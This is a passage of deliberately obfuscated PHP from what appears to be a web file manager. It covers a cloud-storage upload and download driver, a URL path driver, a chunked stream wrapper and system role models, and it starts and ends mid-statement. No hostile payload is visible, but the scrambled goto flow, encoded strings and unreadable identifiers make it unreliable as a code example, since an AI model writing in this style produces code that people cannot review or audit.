!$dïí½Ü‰Ñ†[$d£Ô¡ï“™[1025]] ? $dïí½Ü‰Ñ†[$d£Ô¡ï“™[1025]] : $dïí½Ü‰Ñ†[$d£Ô¡ï“™[1027]]; } public function uploadFormData($c¬©³â·†, $c•ù×æíÕ = 3600) { return $this->uploadPolicy($c¬©³â·†, $c•ù×æíÕ); } public function multiUploadFormData($dÊ´ø„ùì®, $DÔ‚†æé = 3600) { $C©õÓ‰Ñ„ =& $_SERVER[Ö]; $D†Á÷À©Íê = (int) $GLOBALS[$C©õÓ‰Ñ„[7]][$C©õÓ‰Ñ„[77]]; return $this->uploadPolicy($dÊ´ø„ùì®, $DÔ‚†æé, $D†Á÷À©Íê); } private function uploadPolicy($AêÉË¤»Á, $B•£š£ÑèŞ = 3600, $E‡¾Î‰¥ª = 0) { goto E„§×‘àÆã; E„§×‘àÆã: $Fâ–òØĞØ =& $_SERVER[Ö]; $Fá ó±„Àƒ = $Fâ–òØĞØ[8] . $this->bucket; $d¤…ï”ÒÌ = gmdate($Fâ–òØĞØ[1190]); goto d®Üå‘âÉœ; c¦¢§‰é: $d˜¦ÁùôÑ = base64_encode(hash_hmac($Fâ–òØĞØ[1227], "\x50\117\123\124\46{$Fá ó±„Àƒ}\46{$d¤…ï”ÒÌ}\46{$Dò÷¨«Î¹†}", md5("{$this->userpass}"), !0)); $EôùµÛˆÛŒ = array($Fâ–òØĞØ[1098] => $Dò÷¨«Î¹†, $Fâ–òØĞØ[1262] => "\x55\120\x59\125\x4e\40{$this->username}\72{$d˜¦ÁùôÑ}", $Fâ–òØĞØ[165] => $this->endpoint . $Fá ó±„Àƒ); return $EôùµÛˆÛŒ; goto aÖó ¼ ÕÃ; d®Üå‘âÉœ: $CÕ×‘·²Ù = array($Fâ–òØĞØ[1258] => $this->bucket, $Fâ–òØĞØ[1259] => $AêÉË¤»Á, $Fâ–òØĞØ[1260] => time() + $B•£š£ÑèŞ, $Fâ–òØĞØ[1261] => $d¤…ï”ÒÌ); if ($E‡¾Î‰¥ª) { $CÕ×‘·²Ù[$Fâ–òØĞØ[1176]] = $E‡¾Î‰¥ª; } $Dò÷¨«Î¹† = base64_encode(json_encode($CÕ×‘·²Ù)); goto c¦¢§‰é; aÖó ¼ ÕÃ: } public function download($cÅì—´Ø¬¾, $Fß’¾‘‘ø¢) { goto f¿‰Œ¨‚ˆ; f¿‰Œ¨‚ˆ: $d®£¢¢îã¿ = IO::getPathInner(IO::mkfile($Fß’¾‘‘ø¢)); if (!($fÑ­ÏùáÌ× = $this->link($cÅì—´Ø¬¾))) { return !1; } $a¿©µã‰ŸÀ = 0; goto aª· ÈÎº²; F½¸Ÿšî‰¥: fclose($eøù‚³°²¢); return $Fß’¾‘‘ø¢; goto f¹Â¿Êã•; aª· ÈÎº²: $dƒš—İ”øÀ = 1024 * 200; $eøù‚³°²¢ = fopen($d®£¢¢îã¿, $_SERVER[Ö][1211]); while (!0) { $f£œÎ‰¸ª± = $this->fileSubstr($cÅì—´Ø¬¾, $a¿©µã‰ŸÀ, $dƒš—İ”øÀ); if ($f£œÎ‰¸ª± === !1) { return !1; } fwrite($eøù‚³°²¢, $f£œÎ‰¸ª±); $a¿©µã‰ŸÀ += $dƒš—İ”øÀ; if (strlen($f£œÎ‰¸ª±) < $dƒš—İ”øÀ) { break; } } goto F½¸Ÿšî‰¥; f¹Â¿Êã•: } public function link($C«§ñˆÇÆ, $c®ßä£‚¨­ = array()) { $aÁË©‰Ï˜ =& $_SERVER[Ö]; $C«§ñˆÇÆ = trim($C«§ñˆÇÆ, $aÁË©‰Ï˜[8]); if (!empty($this->token)) { $D¡È£ÜÙÛÅ = strtotime(date($aÁË©‰Ï˜[1263])); $EÆË©ÓÈø  = substr(md5($this->token . $aÁË©‰Ï˜[268] . $D¡È£ÜÙÛÅ . $aÁË©‰Ï˜[1264] . $C«§ñˆÇÆ), 12, 8) . $D¡È£ÜÙÛÅ; $c®ßä£‚¨­[] = $aÁË©‰Ï˜[1265] . $EÆË©ÓÈø ; } $B‡”â¤»Äâ = !empty($c®ßä£‚¨­) ? $aÁË©‰Ï˜[69] . implode($aÁË©‰Ï˜[268], $c®ßä£‚¨­) : $aÁË©‰Ï˜[33]; return $this->getHost() . $aÁË©‰Ï˜[8] . $C«§ñˆÇÆ . $B‡”â¤»Äâ; } public function fileOut($D‚ŒÒŒˆÓ», $A¥¥æŠƒ = false, $dÃçæ“²¯ = false, $fàªÜ’‹•Ì = '') { if (!$dÃçæ“²¯) { $dÃçæ“²¯ = $this->pathThis($D‚ŒÒŒˆÓ»); } $EŒÒñ®•³‡ = $A¥¥æŠƒ ? array($_SERVER[Ö][1266] . rawurlencode($dÃçæ“²¯)) : array(); $B åŠ´½• = $this->link($D‚ŒÒŒˆÓ», $EŒÒñ®•³‡); $this->fileOutLink($B åŠ´½•); } public function fileOutServer($aÓ–æ­éâ¯, $EĞÉÍ«áñ» = false, $A½¦Ù±é‰¤ = false, $FİÆñÁ¥Û› = '') { parent::fileOut($aÓ–æ­éâ¯, $EĞÉÍ«áñ», $A½¦Ù±é‰¤, $FİÆñÁ¥Û›); } public function fileOutImage($A·ì“´Ûã¨, $Fí†³Ş³“ = 250) { $E½ë‹³ƒÆØ = $this->link($A·ì“´Ûã¨ . $_SERVER[Ö][1267] . $Fí†³Ş³“); $this->fileOutLink($E½ë‹³ƒÆØ); } public function fileOutImageServer($aŸ£®ŞÆ±À, $DÇÚ«†ÁÃ† = 250) { parent::fileOutImage($aŸ£®ŞÆ±À, $DÇÚ«†ÁÃ†); } public function hashMd5($A¨»¤„Ù‰Ø) { $D©ÙõĞ÷µ =& $_SERVER[Ö]; $bÍÙÔŒµ = $this->objectMeta($A¨»¤„Ù‰Ø); return isset($bÍÙÔŒµ[$D©ÙõĞ÷µ[192]]) ? $bÍÙÔŒµ[$D©ÙõĞ÷µ[192]] : !1; } public function size($EÓ“êøÍŒç) { $a£Ëë‘Î„„ = $this->objectMeta($EÓ“êøÍŒç); return $a£Ëë‘Î„„ ? $a£Ëë‘Î„„[$_SERVER[Ö][77]] : 0; } public function info($a£÷•ÖŞÒÜ) { if ($this->isFolder($a£÷•ÖŞÒÜ)) { return $this->folderInfo($a£÷•ÖŞÒÜ); } else { if ($this->isFile($a£÷•ÖŞÒÜ)) { return $this->fileInfo($a£÷•ÖŞÒÜ); } } return !1; } public function exist($eÊÍÌ¡¹±) { return $this->isFile($eÊÍÌ¡¹±) || $this->isFolder($eÊÍÌ¡¹±); } public function isFile($eµ£é÷ê‡ä) { return !$this->isFolder($eµ£é÷ê‡ä) && $this->objectMeta($eµ£é÷ê‡ä); } public function isFolder($fÊ¨†Û¶›) { return $this->cacheMethod($_SERVER[Ö][219], $fÊ¨†Û¶›); } protected function objectMeta($eƒÀµİóğ—) { return $this->cacheMethod($_SERVER[Ö][220], $eƒÀµİóğ—); } protected function _objectMeta($aíÌéŒ¯) { goto bé‚×ğ”èŒ; bé‚×ğ”èŒ: $eùùÙá±‚ =& $_SERVER[Ö]; if ($aíÌéŒ¯ == $eùùÙá±‚[33] || $aíÌéŒ¯ == $eùùÙá±‚[8]) { return array(); } $cìÏ¥§©ğ = $this->ussRequest($aíÌéŒ¯, $eùùÙá±‚[1268]); goto FÇª®É…¯­; c‹áªá¡ˆë: $dİß£Ø»³¶ = array($eùùÙá±‚[28] => get_path_this($aíÌéŒ¯), $eùùÙá±‚[29] => isset($FçŒ­·ÔÑ[$eùùÙá±‚[1269]]) ? $FçŒ­·ÔÑ[$eùùÙá±‚[1269]] : null, $eùùÙá±‚[77] => isset($FçŒ­·ÔÑ[$eùùÙá±‚[1270]]) ? $FçŒ­·ÔÑ[$eùùÙá±‚[1270]] : null, $eùùÙá±‚[192] => isset($FçŒ­·ÔÑ[$eùùÙá±‚[1271]]) ? $FçŒ­·ÔÑ[$eùùÙá±‚[1271]] : null, $eùùÙá±‚[1238] => isset($FçŒ­·ÔÑ[$eùùÙá±‚[1272]]) ? $FçŒ­·ÔÑ[$eùùÙá±‚[1272]] : null); $dİß£Ø»³¶[$eùùÙá±‚[1239]] = isset($FçŒ­·ÔÑ[$eùùÙá±‚[1273]]) ? strtotime($FçŒ­·ÔÑ[$eùùÙá±‚[1273]]) : $dİß£Ø»³¶[$eùùÙá±‚[1238]]; return $dİß£Ø»³¶; goto a¦“ôÇ¿ë; FÇª®É…¯­: if (!$cìÏ¥§©ğ[$eùùÙá±‚[1025]]) { return null; } $FçŒ­·ÔÑ = isset($cìÏ¥§©ğ[$eùùÙá±‚[1027]]) ? $cìÏ¥§©ğ[$eùùÙá±‚[1027]] : array(); if (!isset($FçŒ­·ÔÑ[$eùùÙá±‚[1269]])) { return null; } goto c‹áªá¡ˆë; a¦“ôÇ¿ë: } protected function _isFolder($A¿ã­Ø§‚µ) { $a„”Ë³ñ© =& $_SERVER[Ö]; if ($A¿ã­Ø§‚µ == $a„”Ë³ñ©[33] || $A¿ã­Ø§‚µ == $a„”Ë³ñ©[8]) { return !0; } $d°ÃŒ¿­˜ = $this->objectMeta($A¿ã­Ø§‚µ); return isset($d°ÃŒ¿­˜[$a„”Ë³ñ©[29]]) && $d°ÃŒ¿­˜[$a„”Ë³ñ©[29]] == $a„”Ë³ñ©[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($B¾ƒÉù“×“ = false) { } public function exist($C¯çÃø’åğ) { $DøÆ…íÌ¾Š = $this->info($C¯çÃø’åğ); return $DøÆ…íÌ¾Š[$_SERVER[Ö][184]]; } public function isFile($F‘‡¨Íà») { $dÄ‡²é«”Æ = $this->info($F‘‡¨Íà»); return $dÄ‡²é«”Æ[$_SERVER[Ö][184]]; } public function isFolder($B’ÃôØˆÓ¢) { return !1; } public function size($cğí¤†‹­Ü) { $fÄÓÚÃ‚Àë = $this->info($cğí¤†‹­Ü); return $fÄÓÚÃ‚Àë[$_SERVER[Ö][77]]; } public function info($BÙŒÁ‹‚Ø¼) { return $this->infoParse($BÙŒÁ‹‚Ø¼); } public function infoAuth($eîìÔ†èÏ) { return $this->infoParse($eîìÔ†èÏ); } public function infoWithChildren($f†É±²ôºš) { return $this->infoParse($f†É±²ôºš); } public function infoFull($a‡¤Í©‰”‹) { return $this->infoParse($a‡¤Í©‰”‹); } private function infoParse($cäå³•ÄŒ¨) { $B÷íÒğ‡«Œ =& $_SERVER[Ö]; $c³ÄŸØÛé = $this->header($cäå³•ÄŒ¨); if (!$c³ÄŸØÛé || !$c³ÄŸØÛé[$B÷íÒğ‡«Œ[682]]) { return !1; } $AâÚˆ”‡ˆñ = _get($c³ÄŸØÛé, $B÷íÒğ‡«Œ[321], 0); $d­†ª‚Óö = array($B÷íÒğ‡«Œ[28] => $c³ÄŸØÛé[$B÷íÒğ‡«Œ[28]], $B÷íÒğ‡«Œ[75] => $cäå³•ÄŒ¨, $B÷íÒğ‡«Œ[29] => $B÷íÒğ‡«Œ[163], $B÷íÒğ‡«Œ[77] => intval($AâÚˆ”‡ˆñ), $B÷íÒğ‡«Œ[156] => get_path_ext($c³ÄŸØÛé[$B÷íÒğ‡«Œ[28]]), $B÷íÒğ‡«Œ[1147] => $AâÚˆ”‡ˆñ > 0 && $c³ÄŸØÛé[$B÷íÒğ‡«Œ[1274]], $B÷íÒğ‡«Œ[1148] => !1); return $d­†ª‚Óö; } private function header($CÜÈ„‘¯‡) { if (isset(self::$_cacheHeader[$CÜÈ„‘¯‡])) { return self::$_cacheHeader[$CÜÈ„‘¯‡]; } self::$_cacheHeader[$CÜÈ„‘¯‡] = url_header($CÜÈ„‘¯‡); return self::$_cacheHeader[$CÜÈ„‘¯‡]; } public function hashSimple($BŒ‹Ñ”Ëà™, $CÊ£”¹¡œ¸ = false) { goto BÑĞÇÑ»¨; B°¸› Éòº: $AÅ†ó‚ªŠ‡ = timeFloat(); $d‡¨Ğ°…éÀ = 15; for ($A³ŸŞÑğïµ = 0; $A³ŸŞÑğïµ < $dœ²õç¡‚; $A³ŸŞÑğïµ++) { if (timeFloat() - $AÅ†ó‚ªŠ‡ > $d‡¨Ğ°…éÀ) { return !1; } $f£ã›Ìí™è = $this->fileSubstr($BŒ‹Ñ”Ëà™, $e»ù”À³ * $A³ŸŞÑğïµ, $d¢Ö“­”³); if (!$f£ã›Ìí™è) { return !1; } $b¾Í ¾£¹³ .= $f£ã›Ìí™è; } goto dÕäŒéâ÷Ö; BÑÆ¤‘¨æ—: if ($eõ‹Ğ”Ä×À <= $d¢Ö“­”³ * $dœ²õç¡‚) { return md5($this->fileSubstr($BŒ‹Ñ”Ëà™, 0, $eõ‹Ğ”Ä×À)) . $eõ‹Ğ”Ä×À; } $e»ù”À³ = intval($eõ‹Ğ”Ä×À / $dœ²õç¡‚); $b¾Í ¾£¹³ = $fÂìæÜÚ²¢[33]; goto B°¸› Éòº; BÑĞÇÑ»¨: $fÂìæÜÚ²¢ =& $_SERVER[Ö]; $fœ¢¥âÇ¢Ş = $this->info($BŒ‹Ñ”Ëà™); if (!$fœ¢¥âÇ¢Ş || !$fœ¢¥âÇ¢Ş[$fÂìæÜÚ²¢[184]]) { return !1; } goto F²èâÓÔ; dÕäŒéâ÷Ö: $b¾Í ¾£¹³ .= $this->fileSubstr($BŒ‹Ñ”Ëà™, $eõ‹Ğ”Ä×À - $d¢Ö“­”³, $d¢Ö“­”³); return md5($b¾Í ¾£¹³) . $eõ‹Ğ”Ä×À; goto cÃ¸²‹Ÿéª; F²èâÓÔ: $eõ‹Ğ”Ä×À = $fœ¢¥âÇ¢Ş[$fÂìæÜÚ²¢[77]]; $d¢Ö“­”³ = 200; $dœ²õç¡‚ = 50; goto BÑÆ¤‘¨æ—; cÃ¸²‹Ÿéª: } public function getContent($AçÍÇøÍ¼) { return $this->fileSubstr($AçÍÇøÍ¼); } public function fileSubstr($Fæâ»Ó™Ãˆ, $Fà“Ş±º® = 0, $cæ¬Õ¼±°Ò = -1) { goto eŠÇ·ò‰; eŠÇ·ò‰: $e¼§Ôè£ãê =& $_SERVER[Ö]; $e®â¥ÌŒÛ¦ = $this->info($Fæâ»Ó™Ãˆ); if (!$e®â¥ÌŒÛ¦ || !$e®â¥ÌŒÛ¦[$e¼§Ôè£ãê[184]] && $e®â¥ÌŒÛ¦[$e¼§Ôè£ãê[77]] > 1024 * 1024 * 10) { return !1; } goto Eà˜ğ¸ÍÉê; F„å÷êŒ½ã: $C®õ›ƒëàË = url_request($Fæâ»Ó™Ãˆ, $e¼§Ôè£ãê[212], !1, $Aƒ²ˆ†ùê›, !1, !1, 1); return $C®õ›ƒëàË[$e¼§Ôè£ãê[1027]] ? $C®õ›ƒëàË[$e¼§Ôè£ãê[1027]] : $e¼§Ôè£ãê[33]; goto Fë¾‚Ï• å; Eà˜ğ¸ÍÉê: if ($cæ¬Õ¼±°Ò === -1) { $cæ¬Õ¼±°Ò = $e®â¥ÌŒÛ¦[$e¼§Ôè£ãê[77]]; } if ($cæ¬Õ¼±°Ò == 0) { return $e¼§Ôè£ãê[33]; } $Aƒ²ˆ†ùê› = array($e¼§Ôè£ãê[1275] . $Fà“Ş±º® . $e¼§Ôè£ãê[707] . ($Fà“Ş±º® + $cæ¬Õ¼±°Ò - 1)); goto F„å÷êŒ½ã; Fë¾‚Ï• å: } public function download($Bì§Öˆƒˆ , $f‘Õ Œ‘êä) { Downloader::start($Bì§Öˆƒˆ , $f‘Õ Œ‘êä); return $f‘Õ Œ‘êä; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($f„‘ñ•Ÿ¿±, $dÅÂî = '') { goto BÓ¦êãŸéï; CîÓŸËÄ‘„: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$f„‘ñ•Ÿ¿±])) { self::$_chunkBuffer[$f„‘ñ•Ÿ¿±] = array(); } goto A‡“ƒÃ„©¹; A‡“ƒÃ„©¹: return $this->info ? !0 : !1; goto A¿¯ë³™«; BÓ¦êãŸéï: $this->info = $this->info($f„‘ñ•Ÿ¿±); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ö][75]]; goto CîÓŸËÄ‘„; A¿¯ë³™«: } function stream_read($CŒŸ†Û—¿) { $dŞ¹†‹ÀŠ = $this->fileSubstr($this->pose, $CŒŸ†Û—¿); $this->pose += strlen($dŞ¹†‹ÀŠ); return $dŞ¹†‹ÀŠ; } public function stream_tell() { return $this->pose; } public function stream_seek($b¢ô×Î°³š, $D¾ÆÆÃ¿) { $Fù…ñè¨À =& $_SERVER[Ö]; if ($D¾ÆÆÃ¿ == SEEK_SET) { $this->pose = $b¢ô×Î°³š; } else { if ($D¾ÆÆÃ¿ == SEEK_CUR) { $this->pose += $b¢ô×Î°³š; } else { if ($D¾ÆÆÃ¿ == SEEK_END) { $this->pose = $this->info[$Fù…ñè¨À[77]] + intval($b¢ô×Î°³š); } } } if ($b¢ô×Î°³š < 0) { $this->pose = $this->info[$Fù…ñè¨À[77]] + $b¢ô×Î°³š; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ö][77]]; } public function stream_close() { return !0; } public function url_stat($D‹´±–š¯ë, $eÚº¸›¼¨‡) { $C…ª­‚Öö =& $_SERVER[Ö]; $Fã†ËìÎ«» = $this->info($D‹´±–š¯ë); return array($C…ª­‚Öö[1276] => 0, $C…ª­‚Öö[1277] => 0, $C…ª­‚Öö[12] => 32768 + 511, $C…ª­‚Öö[1278] => 0, $C…ª­‚Öö[1279] => 0, $C…ª­‚Öö[1280] => 0, $C…ª­‚Öö[1281] => 0, $C…ª­‚Öö[77] => $Fã†ËìÎ«»[$C…ª­‚Öö[77]], $C…ª­‚Öö[1282] => $Fã†ËìÎ«»[$C…ª­‚Öö[1153]], $C…ª­‚Öö[1239] => $Fã†ËìÎ«»[$C…ª­‚Öö[106]], $C…ª­‚Öö[1238] => $Fã†ËìÎ«»[$C…ª­‚Öö[183]], $C…ª­‚Öö[1283] => 0, $C…ª­‚Öö[1284] => 0); } static $fileInfo = array(); public function info($eğÖÖ¨®…) { $FÔâØéåãÁ = $_SERVER[Ö][1285]; if (isset(self::$fileInfo[$eğÖÖ¨®…])) { return self::$fileInfo[$eğÖÖ¨®…]; } if (substr($eğÖÖ¨®…, 0, strlen($FÔâØéåãÁ)) != $FÔâØéåãÁ) { return !1; } self::$fileInfo[$eğÖÖ¨®…] = IO::info(substr($eğÖÖ¨®…, strlen($FÔâØéåãÁ))); return self::$fileInfo[$eğÖÖ¨®…]; } public static function read($cù»ì„£‚², $A©‚ƒå‚˜Ñ, $dÑ³ª‹×ğ†) { goto FÈ°“»¯¿×; FÔÈõçĞ‹½: $AÀ‚†•ˆøÕ = 0; while ($AÀ‚†•ˆøÕ < $dÑ³ª‹×ğ†) { $d×ˆ¯„õ‚º = min($c„ïà¨Ê²™, $dÑ³ª‹×ğ† - $AÀ‚†•ˆøÕ); $F¥®¼¤­“Œ .= fread($dè¥ÄÒè’, $d×ˆ¯„õ‚º); $AÀ‚†•ˆøÕ += $d×ˆ¯„õ‚º; } fclose($dè¥ÄÒè’); goto eó°í Ô¼Ó; eó°í Ô¼Ó: return $F¥®¼¤­“Œ; goto b»ôšÛ‚‚‡; CÛÎŠ›Õé¹: $c„ïà¨Ê²™ = 8192; fseek($dè¥ÄÒè’, $A©‚ƒå‚˜Ñ, SEEK_SET); $F¥®¼¤­“Œ = $c¡«Ú³·‚ä[33]; goto FÔÈõçĞ‹½; FÈ°“»¯¿×: $c¡«Ú³·‚ä =& $_SERVER[Ö]; $dè¥ÄÒè’ = fopen($cù»ì„£‚², $c¡«Ú³·‚ä[1155]); if (!$dè¥ÄÒè’) { return $c¡«Ú³·‚ä[33]; } goto CÛÎŠ›Õé¹; b»ôšÛ‚‚‡: } public function fileSubstr($Aƒœ‰Ü¬Ì, $AˆÄÈÚ‡ÌÉ) { goto DŠÛ‡‹±Ğç; A…ÆŠô¾Ç : ksort($Dì³ó®–); $eãïø®À‹† = substr($d§”Òğ¦âõ, $Aƒœ‰Ü¬Ì - $c‹˜À¾Ú÷, $AˆÄÈÚ‡ÌÉ); return $eãïø®À‹†; goto bî÷è×”Œ‘; aÎƒÙ¡¤: $FŸĞ³”èµ = ceil(($Aƒœ‰Ü¬Ì + $AˆÄÈÚ‡ÌÉ) / $c´Ş®ª…¯¾) * $c´Ş®ª…¯¾ - $c‹˜À¾Ú÷; $d§”Òğ¦âõ = IO::fileSubstr($this->path, $c‹˜À¾Ú÷, $FŸĞ³”èµ); $Dì³ó®–[$c‹˜À¾Ú÷ . $AîŒ‰£Š[33]] = $d§”Òğ¦âõ; goto A…ÆŠô¾Ç ; E±ë¼§Š™ß: if ($Aƒœ‰Ü¬Ì + $AˆÄÈÚ‡ÌÉ > $dçñË¬Æä‡) { $AˆÄÈÚ‡ÌÉ = $dçñË¬Æä‡ - $Aƒœ‰Ü¬Ì; } if ($AˆÄÈÚ‡ÌÉ <= 0) { return $AîŒ‰£Š[33]; } if ($Aƒœ‰Ü¬Ì < 0 || $Aƒœ‰Ü¬Ì >= $dçñË¬Æä‡ || $AˆÄÈÚ‡ÌÉ <= 0 || $AˆÄÈÚ‡ÌÉ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\154\x65\x52\x65\x61\x64\40\x65\x72\162\x6f\x72\41\x20\x73\x74\x61\162\164\x3d{$Aƒœ‰Ü¬Ì}\73\154\145\156\147\164\x68\75{$AˆÄÈÚ‡ÌÉ}\73\x20\x73\x69\x7a\x65\x3d{$dçñË¬Æä‡}\73"); } goto fí°Øß¸Ó¼; DŠÛ‡‹±Ğç: $AîŒ‰£Š =& $_SERVER[Ö]; $dçñË¬Æä‡ = $this->info[$AîŒ‰£Š[77]]; $dÁùÌæÏ¥ï = $Aƒœ‰Ü¬Ì; goto e©¨Ãä…†³; e©¨Ãä…†³: $dÀ±˜õƒØØ = $AˆÄÈÚ‡ÌÉ; if ($Aƒœ‰Ü¬Ì < 0) { $Aƒœ‰Ü¬Ì = $dçñË¬Æä‡ + $Aƒœ‰Ü¬Ì; } if ($AˆÄÈÚ‡ÌÉ === !1) { $AˆÄÈÚ‡ÌÉ = $dçñË¬Æä‡ - $Aƒœ‰Ü¬Ì; } goto E±ë¼§Š™ß; FÙË­Ş„·„: $E³ƒ‡ËæÈ± = 0; $aÎ›Ò›Ä˜§ = 0; $aéŞÌÇ®Õ = $AîŒ‰£Š[33]; goto F¥ä“ƒë©Œ; fí°Øß¸Ó¼: $c´Ş®ª…¯¾ = 64 * 1024; $Dì³ó®– =& self::$_chunkBuffer[$this->path]; if (!$Dì³ó®–) { $Dì³ó®– = array(); } goto FÙË­Ş„·„; F¥ä“ƒë©Œ: foreach ($Dì³ó®– as $E³ƒ‡ËæÈ± => $aéŞÌÇ®Õ) { $E³ƒ‡ËæÈ± = intval($E³ƒ‡ËæÈ±); $aÎ›Ò›Ä˜§ = $E³ƒ‡ËæÈ± + strlen($aéŞÌÇ®Õ); if ($Aƒœ‰Ü¬Ì >= $aÎ›Ò›Ä˜§) { continue; } if ($Aƒœ‰Ü¬Ì >= $E³ƒ‡ËæÈ± && $Aƒœ‰Ü¬Ì + $AˆÄÈÚ‡ÌÉ <= $aÎ›Ò›Ä˜§) { return substr($aéŞÌÇ®Õ, $Aƒœ‰Ü¬Ì - $E³ƒ‡ËæÈ±, $AˆÄÈÚ‡ÌÉ); } break; } if (count($Dì³ó®–) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($AîŒ‰£Š[1286], $AîŒ‰£Š[1287] . count($Dì³ó®–) . "\x3b\163\164\x61\162\x74\75{$Aƒœ‰Ü¬Ì}\x2c\x6c\145\156\x67\x74\150\75{$AˆÄÈÚ‡ÌÉ}\73\x70\157\x73\x65\x3a{$E³ƒ‡ËæÈ±}\176{$aÎ›Ò›Ä˜§}"); throw new Exception($AîŒ‰£Š[1288]); } $c‹˜À¾Ú÷ = intval($Aƒœ‰Ü¬Ì / $c´Ş®ª…¯¾) * $c´Ş®ª…¯¾; goto aÎƒÙ¡¤; bî÷è×”Œ‘: } private function log($CèİíÅ´, $cÃ¹¸‚ñ°…) { $DËœ¦óÇİÁ =& $_SERVER[Ö]; $bšÅ‚•áä× = timeFloat() - $this->timeStart; write_log(sprintf($DËœ¦óÇİÁ[1289], $CèİíÅ´, $this->info[$DËœ¦óÇİÁ[28]], $bšÅ‚•áä×, $cÃ¹¸‚ñ°…), $DËœ¦óÇİÁ[1204]); } } goto dõë¡›â˜ì; EÒì½áÂÇé: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\145\x6d\x5f\157\160\164\x69\x6f\156"; protected $jsonField = array("\155\145\156\x75", "\x72\157\x6c\145", "\162\x6f\x6c\145\x47\x72\x6f\165\160", "\x72\x65\147\x69\x73\164", "\x65\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($F©†­ÉÛµ) { return "\x53\x79\x73\164\x65\x6d\x4f\x70\x74\151\x6f\156\x5f{$F©†­ÉÛµ}"; } protected function optionDefault($B£ ÇÎõ” = '') { $DğãÄ‚Ø =& $_SERVER[Ö]; if ($B£ ÇÎõ” == $DğãÄ‚Ø[33]) { return $GLOBALS[$DğãÄ‚Ø[6]][$DğãÄ‚Ø[2452]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\162\x6f\x6c\x65\114\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\x61\x75\164\x68", "\x6c\141\x62\x65\154", "\x64\x69\x73\x70\154\141\171", "\x73\x79\x73\x74\145\x6d", "\x64\x65\x73\x63", "\151\x67\x6e\157\x72\145\105\170\x74", "\151\147\156\x6f\162\x65\106\x69\154\145\x53\151\x7a\145", "\x61\x64\x6d\x69\x6e\x69\x73\164\162\141\x74\x6f\162", "\163\157\x72\164"); public function listData($dÁ¿“ä°®æ = false, $dÁê†ß¿ = "\163\x6f\162\x74", $DõˆÊÒ»Õ® = false) { return parent::listData($dÁ¿“ä°®æ, $dÁê†ß¿, $DõˆÊÒ»Õ®); } public function update($EÊöÇì÷¯ö, $EÍíŒ˜´•) { goto b®¬½«›“; a«œâ“Ûá: if (!$AÂŞø…ÛŠ° || $bªÌê‡¢¥Â && $bªÌê‡¢¥Â[$bŠõëÛî¢[363]] != $AÂŞø…ÛŠ°[$bŠõëÛî¢[363]]) { return !1; } if ($bªÌê‡¢¥Â[$bŠõëÛî¢[2453]] == 1) { $EÍíŒ˜´• = array($bŠõëÛî¢[28] => $EÍíŒ˜´•[$bŠõëÛî¢[28]], $bŠõëÛî¢[2095] => $EÍíŒ˜´•[$bŠõëÛî¢[2095]]); } $this->filterAuth($EÍíŒ˜´•[$bŠõëÛî¢[372]]); goto c†Ö‡Úùö®; c†Ö‡Úùö®: return parent::update($EÊöÇì÷¯ö, $EÍíŒ˜´•); goto fØê¨‚å—; b®¬½«›“: $bŠõëÛî¢ =& $_SERVER[Ö]; $AÂŞø…ÛŠ° = parent::listData($EÊöÇì÷¯ö); $bªÌê‡¢¥Â = $this->findByName($EÍíŒ˜´•[$bŠõëÛî¢[28]]); goto a«œâ“Ûá; fØê¨‚å—: } public function remove($cÇ Š–Ë²») { $bƒ¤½¤Â»¥ = parent::listData($cÇ Š–Ë²»); if (!$bƒ¤½¤Â»¥ || $bƒ¤½¤Â»¥[$_SERVER[Ö][1073]]) { return !1; } return parent::remove($cÇ Š–Ë²»); } public function add($Fá†ËƒÓß¥) { goto FÕ‘“¿å¹å; E‘¸ÃÑñæŒ: $B÷«—éê½‡ = array($aÄ„—¾ç[382] => $CË­ÉÛ—˜«, $aÄ„—¾ç[2083] => $aÄ„—¾ç[33], $aÄ„—¾ç[2079] => $aÄ„—¾ç[2096], $aÄ„—¾ç[2454] => 1, $aÄ„—¾ç[2082] => 0, $aÄ„—¾ç[2455] => 0, $aÄ„—¾ç[2081] => $this->getSort()); $Fá†ËƒÓß¥ = array_merge($B÷«—éê½‡, $Fá†ËƒÓß¥); $this->filterAuth($Fá†ËƒÓß¥[$aÄ„—¾ç[372]]); goto D¼¡Šù¢Ê; FÕ‘“¿å¹å: $aÄ„—¾ç =& $_SERVER[Ö]; $CË­ÉÛ—˜« = $Fá†ËƒÓß¥[$aÄ„—¾ç[28]]; if ($this->findByName($CË­ÉÛ—˜«)) { return !1; } goto E‘¸ÃÑñæŒ; D¼¡Šù¢Ê: return parent::insert($Fá†ËƒÓß¥); goto aôÑë…ƒ»ã; aôÑë…ƒ»ã: } private function getSort() { $dŒíŒõÅíÊ =& $_SERVER[Ö]; $eÌ¦Ò¤ôõ– = parent::listData(); $bİêÚ‹½Ö = array_to_keyvalue($eÌ¦Ò¤ôõ–, $dŒíŒõÅíÊ[33], $dŒíŒõÅíÊ[2098]); return empty($bİêÚ‹½Ö) ? 0 : max($bİêÚ‹½Ö) + 1; } private function filterAuth(&$eëš¼ºíç†) { $Bì™ó¬à°Õ =& $_SERVER[Ö]; $FÊ‰Ôñ­Ï” = array(); $eà¯Ìô°¯ = array_filter(explode($Bì™ó¬à°Õ[47], $eëš¼ºíç†)); foreach ($eà¯Ìô°¯ as $eëš¼ºíç†) { $bÏÑùÎ •ª = explode($Bì™ó¬à°Õ[91], $eëš¼ºíç†); if ($bÏÑùÎ •ª[0] == $Bì™ó¬à°Õ[1757] && $bÏÑùÎ •ª[1] != $Bì™ó¬à°Õ[1029]) { $aàÃ©Šñ« = $bÏÑùÎ •ª[0] . $Bì™ó¬à°Õ[91] . $bÏÑùÎ •ª[1] . $Bì™ó¬à°Õ[2456]; if 